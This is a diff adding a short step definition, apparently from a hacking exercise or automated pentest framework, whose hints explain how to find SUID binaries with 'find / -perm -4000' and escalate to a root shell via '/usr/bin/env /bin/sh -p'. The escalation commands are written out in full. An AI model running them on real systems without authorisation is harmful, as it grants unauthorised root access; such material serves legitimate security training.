@@ -1,0 +1,11 @@
+description: get root by using usr/bin/env
+function: magic_function
+argument: []
+In: []
+condition: 
+Out: []
+hint:
+  - Please enter `find / -type f -perm -4000 2>/dev/null` in shell you got.
+  - "If you see \"/usr/bin/env\", enter commands below:"
+  - "`/usr/bin/env /bin/sh -p`"
+  - and you will be root (use "whoami" to check).
